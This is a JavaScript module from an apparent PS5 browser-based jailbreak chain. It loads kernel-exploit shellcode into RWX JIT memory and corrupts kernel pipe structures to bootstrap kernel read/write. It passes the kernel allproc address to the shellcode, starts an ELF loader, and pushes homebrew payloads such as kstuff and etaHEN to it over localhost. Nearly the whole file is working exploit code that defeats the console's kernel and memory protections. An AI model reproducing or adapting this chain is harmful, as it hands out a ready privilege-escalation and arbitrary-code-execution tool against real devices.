import { int64 } from "./utils/int64.js";

const O_NONBLOCK = 0x4;
const PROT_RW = 0x3, PROT_RWX = 0x7;
const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;

/* The autoloader serves this page at <app>/relapse/index.html, so a single
   "../" climbs out of the exploit dir into the versioned app dir. */
const SHARED_BASE = "../shared/";
const DEFAULT_KEXP = "kexp-ps5.bin";
const DEFAULT_ELFLDR = "elfldr-ps5.elf";

/* Fixed KEXP_API_* contract (ps5-kexp include/types.h):
   [0] sceKernelSendNotificationRequest   (libkernel)
   [1] sysctlbyname                       (libkernel)
   [2] pthread_create                     (libkernel)
   [3] pthread_join                       (libkernel)
   [4] getpid                             (libkernel)
   [5] malloc                             (libSceLibcInternal)
   [6] free                               (libSceLibcInternal)
   [7] memcpy                             (libSceLibcInternal)
   [8] memset                             (libSceLibcInternal)
   [9] strcmp                             (libSceLibcInternal)
   [10] memcmp                            (libSceLibcInternal)
   [11] vsnprintf                         (libSceLibcInternal) */
const KEXP_API_ENTRIES = [
  { group: "libkernel", name: "sceKernelSendNotificationRequest" },
  { group: "libkernel", name: "sysctlbyname" },
  { group: "libkernel", name: "pthread_create" },
  { group: "libkernel", name: "pthread_join" },
  { group: "libkernel", name: "getpid" },
  { group: "libc", name: "malloc" },
  { group: "libc", name: "free" },
  { group: "libc", name: "memcpy" },
  { group: "libc", name: "memset" },
  { group: "libc", name: "strcmp" },
  { group: "libc", name: "memcmp" },
  { group: "libc", name: "vsnprintf" },
];

const PIPE = { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, defaultSize: 0x4000 };
const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };

function readU32(bytes, offset) {
  return (bytes[offset] | (bytes[offset + 1] << 8) |
    (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function hex(value) {
  return "0x" + (value instanceof int64 ? value.toString(16) : (Number(value) >>> 0).toString(16));
}

function buildApiTable(p) {
  const tables = window.SYMBOLS || {};
  const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };

  const table = p.malloc(KEXP_API_ENTRIES.length * 8);
  for (let i = 0; i < KEXP_API_ENTRIES.length; i++) {
    const { group, name } = KEXP_API_ENTRIES[i];
    const base = bases[group];
    const offsets = tables[group];
    if (!base || (base.low === 0 && base.hi === 0))
      throw new Error("kexp: " + group + " base is unresolved");
    if (!offsets || typeof offsets[name] !== "number")
      throw new Error("kexp: " + group + " symbol " + name + " is missing");
    p.write8(table.add32(i * 8), base.add32(offsets[name]));
  }
  return table;
}

/* `baseDir` is a directory prefix relative to this page; it defaults to the
   exploit's own payloads/ dir. The autoloader passes ../shared/ for elfldr
   and ../payloads/ for the autoload payload (both climb out of this page's
   directory, so the vendored copy stays relocatable). */
async function fetchBinary(name, baseDir) {
  const response = await fetch((baseDir || "../payloads/") + name);
  if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status);
  return new Uint8Array(await response.arrayBuffer());
}

async function mapElf(name, p, chain, baseDir) {
  const elf = await fetchBinary(name, baseDir);
  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
    throw new Error("kexp: " + name + " is not an ELF");

  const size = (elf.length + 0x3fff) & ~0x3fff;
  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
  if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
    throw new Error("kexp: " + name + " mmap failed");

  const dwords = elf.length & ~3;
  for (let offset = 0; offset < dwords; offset += 4)
    p.write4(base.add32(offset), readU32(elf, offset));
  for (let offset = dwords; offset < elf.length; offset++)
    p.write1(base.add32(offset), elf[offset]);
  if (p.read4(base) >>> 0 !== 0x464c457f)
    throw new Error("kexp: " + name + " copy failed");

  return { base, size: elf.length };
}

async function connectToElfldr(p, chain) {
  const address = p.malloc(16);
  p.write8(address, new int64(0, 0));
  p.write8(address.add32(8), new int64(0, 0));
  p.write4(address, 0x3d230210); // AF_INET, port 9021
  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1

  for (let attempt = 0; attempt < 40; attempt++) {
    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
    const fd = socket.low | 0;
    if (fd >= 0) {
      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
      if ((connected.low >>> 0) === 0) return fd;
      await chain.syscall(SYS_CLOSE, fd);
    }
    await new Promise((resolve) => setTimeout(resolve, 250));
  }

  throw new Error("elfldr is not listening on port 9021");
}

async function sendElf(name, payload, p, chain) {
  const fd = await connectToElfldr(p, chain);
  try {
    for (let offset = 0; offset < payload.size;) {
      const length = Math.min(0x10000, payload.size - offset);
      const written = (await chain.syscall(SYS_WRITE, fd, payload.base.add32(offset), length)).low | 0;
      if (written <= 0) throw new Error(name + " socket write failed");
      offset += written;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

// Public bridge used by the payload menu in main.js.
export async function sendPayload(name, p, chain) {
  const payload = await mapElf(name, p, chain);
  await sendElf(name, payload, p, chain);
  return payload.size;
}

export async function loadOptionalPayloads(p, chain, log) {
  log("preparing optional payloads");
  const kstuff = await mapElf("kstuff.elf", p, chain);
  const shadowmount = await mapElf("shadowmountplus.elf", p, chain);
  const etaHEN = await mapElf("etaHEN.elf", p, chain);
  await sendElf("kstuff.elf", kstuff, p, chain);
  log("kstuff.elf sent");
  await new Promise((resolve) => setTimeout(resolve, 3000));
  await sendElf("shadowmountplus.elf", shadowmount, p, chain);
  log("shadowmountplus.elf sent");
  await sendElf("etaHEN.elf", etaHEN, p, chain);
  log("etaHEN.elf sent");
}

/* Check the existing loopback ELF loader before starting the kernel exploit. */
export async function isElfldrListening(p, chain) {
  const address = p.malloc(16);
  p.write8(address, new int64(0, 0));
  p.write8(address.add32(8), new int64(0, 0));
  p.write4(address, 0x3d230210); // AF_INET, port 9021
  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1

  const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
  const fd = socket.low | 0;
  if (fd < 0) return false;
  try {
    const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
    return (connected.low >>> 0) === 0;
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

/* WebKit Autoloader integration (patches/relapse-autoload.patch): hand the
   autoload payload to the elfldr the kexp just brought up. connectToElfldr()
   already retries for ~10 s, which covers elfldr's startup delay, so there is
   no fixed wait here. Returns the byte count so the parent page can report it. */
export async function loadAutoloadPayload(p, chain, name, baseDir, log) {
  const say = typeof log === "function" ? log : () => {};
  const payload = await mapElf(name, p, chain, baseDir);
  say("elfldr is up, sending " + name + " (" + payload.size + " bytes)");
  await sendElf(name, payload, p, chain);
  say(name + " sent");
  return payload.size;
}


async function mapExecutable(blob, p, chain) {
  const length = (blob.length + 0x3fff) & ~0x3fff;
  const failed = (value) => value.low >>> 0 === 0xffffffff;
  const copyInto = (destination) => {
    const dwords = blob.length & ~3;
    for (let offset = 0; offset < dwords; offset += 4)
      p.write4(destination.add32(offset), readU32(blob, offset));
    for (let offset = dwords; offset < blob.length; offset++)
      p.write1(destination.add32(offset), blob[offset]);
    for (let offset = 0; offset < dwords; offset += 4)
      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset)) return false;
    return true;
  };

  const execFd = await chain.syscall(SYS_JITSHM_CREATE, 0, length, PROT_RWX);
  if (failed(execFd) || execFd.low >= 0x100000)
    throw new Error("kexp: jitshm_create failed (" + hex(execFd) + ")");

  const entry = await chain.syscall(SYS_MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
  if (failed(entry) || entry.low < 0x10000)
    throw new Error("kexp: executable mmap failed (" + hex(entry) + ")");

  if (!copyInto(entry)) {
    const writeFd = await chain.syscall(SYS_JITSHM_ALIAS, execFd, PROT_RW);
    if (failed(writeFd) || writeFd.low >= 0x100000)
      throw new Error("kexp: writable jitshm alias failed");

    const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
    if (failed(writable) || writable.low < 0x10000)
      throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
    if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
      throw new Error("kexp: shellcode copy failed");
    await chain.syscall(SYS_MUNMAP, writable, length);
  }
  return entry;
}

async function makePipePair(p, chain) {
  const fds = p.malloc(8, 1);
  const rv = (await chain.syscall(SYS_PIPE2, fds, O_NONBLOCK)).low | 0;
  if (rv < 0) throw new Error("kexp: pipe2 failed (" + rv + ")");

  const readFd = p.read4(fds) >>> 0;
  const writeFd = p.read4(fds.add32(4)) >>> 0;
  if (!readFd || !writeFd || readFd >= 0x100000 || writeFd >= 0x100000)
    throw new Error("kexp: invalid pipe fds " + readFd + "/" + writeFd);
  return { readFd, writeFd };
}

async function prepareShellcodePipes(krw, master, victim) {
  const table = await krw.read8(krw.procFdAddr);
  const pipeOf = async (fd) => {
    const file = await krw.read8(table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride));
    return krw.read8(file.add32(FD_ENTRY.data));
  };

  const masterPipe = await pipeOf(master.readFd);
  const victimPipe = await pipeOf(victim.readFd);
  await krw.write4(masterPipe.add32(PIPE.count), 0);
  await krw.write4(masterPipe.add32(PIPE.in), 0);
  await krw.write4(masterPipe.add32(PIPE.out), 0);
  await krw.write4(masterPipe.add32(PIPE.size), PIPE.defaultSize);
  await krw.write8(masterPipe.add32(PIPE.buffer), victimPipe);

  const readBack = await krw.read8(masterPipe.add32(PIPE.buffer));
  if (readBack.low !== victimPipe.low || readBack.hi !== victimPipe.hi)
    throw new Error("kexp: pipe bootstrap failed");
}

async function spawnAndJoin(entry, args, p, chain) {
  const tables = window.SYMBOLS || {};
  const offsets = tables.libkernel || {};
  const base = p.libKernelBase;
  const create = offsets.pthread_create_name_np === undefined
    ? offsets.pthread_create
    : offsets.pthread_create_name_np;
  const handle = p.malloc(8);
  const result = p.malloc(8);
  p.write8(handle, 0);
  p.write8(result, 0);

  const created = await chain.call(base.add32(create), handle, new int64(0, 0), entry, args, p.stringify("payload"));
  if (created.low >>> 0 !== 0)
    throw new Error("kexp: pthread_create returned " + hex(created));

  const joined = await chain.call(base.add32(offsets.pthread_join), p.read8(handle), result);
  return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
}

export async function runKexp(krw, p, chain, log) {
  const say = typeof log === "function" ? log : () => {};
  const allprocRva = window.KRW && window.KRW.allproc;
  if (!krw || !krw.ktextBase || !krw.procFdAddr)
    throw new Error("kexp: kernel R/W is incomplete");
  if (typeof allprocRva !== "number")
    throw new Error("kexp: allproc is missing for this firmware");

  const allproc = krw.ktextBase.add32(allprocRva);
  if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
    throw new Error("kexp: invalid allproc address " + hex(allproc));

  /* WebKit Autoloader: boot the shared localhost-only elfldr from ../shared/
     instead of the bundled payloads/elfldr-ps5-1360.elf. */
  const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain, SHARED_BASE);

  /* WebKit Autoloader: run the shared kexp shellcode from ../shared/
     without in-memory binary patching. Pre-resolved function pointers are
     passed via the KXP2 API table in payload args. */
  const blob = await fetchBinary(DEFAULT_KEXP, SHARED_BASE);
  const entry = await mapExecutable(blob, p, chain);

  const master = await makePipePair(p, chain);
  const victim = await makePipePair(p, chain);
  await prepareShellcodePipes(krw, master, victim);

  const apiTable = buildApiTable(p);

  const args = p.malloc(0x38);
  for (let offset = 0; offset < 0x38; offset += 8) p.write8(args.add32(offset), 0);
  p.write4(args.add32(0x00), master.readFd);
  p.write4(args.add32(0x04), master.writeFd);
  p.write4(args.add32(0x08), victim.readFd);
  p.write4(args.add32(0x0c), victim.writeFd);
  p.write8(args.add32(0x10), allproc);
  p.write8(args.add32(0x18), elfldr.base);
  p.write8(args.add32(0x20), elfldr.size);
  p.write4(args.add32(0x28), 0x4b585032); // 'KXP2'
  p.write4(args.add32(0x2c), KEXP_API_ENTRIES.length);
  p.write8(args.add32(0x30), apiTable);

  const result = await spawnAndJoin(entry, args, p, chain);
  if (result.joinResult !== 0)
    throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
  say("elfldr returned " + hex(result.shellcodeResult));
  return true;
}